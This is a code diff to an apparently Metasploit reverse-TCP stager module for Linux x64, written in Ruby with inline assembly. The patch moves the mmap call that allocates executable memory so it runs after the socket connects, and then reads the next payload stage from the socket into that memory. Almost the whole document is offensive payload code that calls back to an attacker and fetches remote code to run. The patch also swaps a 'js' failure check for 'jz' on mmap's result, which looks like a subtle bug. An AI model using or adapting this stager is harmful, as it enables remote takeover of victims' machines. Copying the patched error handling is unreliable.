@@ -90,25 +90,9 @@ module Payload::Linux::ReverseTcp_x64
     sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
     asm = %Q^
-      mmap:
-        xor    rdi, rdi
-        push   0x9
-        pop    rax
-        cdq
-        mov    dh, 0x10
-        mov    rsi, rdx
-        xor    r9, r9
-        push   0x22
-        pop    r10
-        mov    dl, 0x7
-        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
-        test   rax, rax
-        js failed
 
         push   #{retry_count}        ; retry counter
         pop    r9
-        push   rsi
-        push   rax
         push   0x29
         pop    rax
         cdq
@@ -135,7 +119,7 @@ module Payload::Linux::ReverseTcp_x64
         pop    rcx
         pop    rcx
         test   rax, rax
-        jns    recv
+        jns    mmap
 
       handle_failure:
         dec    r9
@@ -161,8 +145,24 @@ module Payload::Linux::ReverseTcp_x64
         pop    rdi
         syscall ; exit(1)
 
+      mmap:
+        xor    rdi, rdi  ; pick the address
+        push   0x9       ; mmap offset
+        pop    rax
+        cdq
+        mov    dh, 0x10
+        mov    rsi, rdx
+        xor    r9, r9
+        push   0x22
+        pop    r10
+        mov    dl, 0x7
+        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
+        test   rax, rax
+        jz failed
+        xchg   rax, rdi
+
       recv:
-        pop    rsi
+        push 0x1000
         pop    rdx
         syscall ; read(3, "", 4096)
         test   rax, rax
